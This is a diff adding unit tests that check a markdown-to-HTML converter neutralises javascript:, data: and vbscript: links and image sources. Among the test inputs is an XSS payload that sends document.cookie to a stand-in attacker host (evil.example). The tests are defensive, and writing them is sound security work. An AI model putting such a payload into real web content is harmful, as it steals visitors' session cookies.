@@ -17,6 +17,21 @@ describe('markdownToHtml', () => {
       '<a href="https://a.com" target="_blank" rel="noopener noreferrer">x</a>',
     )
   })
+  it('neutralises javascript:, data: and vbscript: link targets', () => {
+    for (const url of ["javascript:location='//evil.example/?'+document.cookie", 'JaVaScRiPt:alert(1)', 'data:text/html,x', 'vbscript:x']) {
+      const h = markdownToHtml(`[click](${url})`)
+      expect(h).toContain('href="#"')
+      expect(h.toLowerCase()).not.toMatch(/href="(javascript|data|vbscript):/)
+    }
+  })
+  it('keeps http, https, mailto, anchor and relative links', () => {
+    for (const url of ['https://a.com/x', 'http://a.com', 'mailto:a@b.c', '#top', '/docs/', 'page.html']) {
+      expect(markdownToHtml(`[x](${url})`)).toContain(`href="${url}"`)
+    }
+  })
+  it('neutralises javascript: image sources', () => {
+    expect(markdownToHtml('![a](javascript:alert(1))')).not.toContain('javascript:')
+  })
   it('escapes raw HTML (no injection)', () => {
     const h = markdownToHtml('<script>alert(1)</script>')
     expect(h).not.toContain('<script>')
